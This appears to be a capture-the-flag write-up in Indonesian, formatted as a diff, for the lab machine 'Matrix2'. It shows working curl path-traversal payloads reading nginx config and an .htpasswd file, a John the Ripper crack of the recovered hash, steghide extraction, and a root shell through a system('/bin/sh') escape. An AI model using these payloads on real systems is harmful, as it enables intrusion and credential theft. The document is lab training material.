@@ -1,0 +1,49 @@
+Writeup Matrix2
+
+1. pertama2 kita cek ipnya 
+'netdiscover -i ens33 -r ip_network/netmask'
+ip_server = 192.168.88.181
+
+2. lalu kita scan port menggunakan command :
+'nmap -A -p- ip_server'
+80/tcp    open  http 
+1337/tcp  open  ssl/http 
+12320/tcp open  ssl/http  
+12321/tcp open  ssl/warehouse-sss?
+12322/tcp open  ssl/http 12322
+
+3. dan terdapat beberapa port yang sedikit aneh tapi nampaknya itu adalah port https karena terdapat kata ssl jadi saya cek di browser https://192.168.88.181:1337 dan memerlukan username serta password
+
+4. lalu saya cek kembali port 12320 ternyata ada sebuah web shell yang memerlukan user dan password
+
+5. lalu saya cek port 12322 terdapat web namun saya tidak menemukan apa2 
+
+6. karena tidak menemukan clue apa2 lagi maka saya iseng mengecek satu-persatu vuln yang mungkin ada di web yaitu robots.txt dan ternyata ada clue di web https://192.168.88.181:12322 yak file_view.php
+
+7. saya coba cek https://192.168.88.181:12322/file_view.php tidak terjadi apa2 jadi saya coba curl -k https://192.168.88.181:12322/ dan harus memasukkan parameter yak mungkin karna keberuntungan saya mendapat parameter file dan ini adalah lfi
+
+8. saya mencari sites-available pada nginx ternyata terdapat di /etc/nginx/sites-available/default dan ada clue lagi  
+curl -X POST -k https://192.168.88.181:12322/file_view.php -d 'file=../../../../../etc/nginx/sites-available/default'
+
+9. dan saya pun cek lagi clue nya
+curl -X POST -k https://192.168.88.181:12322/file_view.php -d 'file=../../../../../var/www/p4ss/.htpasswd'
+
+'Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0'
+
+10. spertinya ini adalah hash jadi saya memakai tools john the ripper saya simpan hasil itu ke file passwd
+
+/opt/john/john/run/john passwd -w /opt/wordlist/rockyou.txt
+
+11. dan didapatkan password admin dan username Tr1n17y saya coba ssh tidak bisa lalu saya ingat yang 1337 kita harus memasukkan username dan pasword dan di web itu ada n30 yang kemungkinan username/password di web shell
+
+12. lalu saya cek page source ada comment gambar saya download dan saya extract dengan steghide dan password n30 dan muncul kata P4$$w0rd berarti ini adalah password web shell 
+
+13. saya masuk ke web shell dengan username n30 dan password tadi dan bisa
+
+14. saya bingung disini apa yang diharuskan untuk bisa masuk ke user root
+
+15. saya pun coba cek file hidden terdapat file .bash_history saya pun cek dan ada clue disana saya coba commandnya dan dapat user root
+
+'morpheus 'BEGIN {system("/bin/sh")}''
+
+dan dapat user root dan dapat flagnya
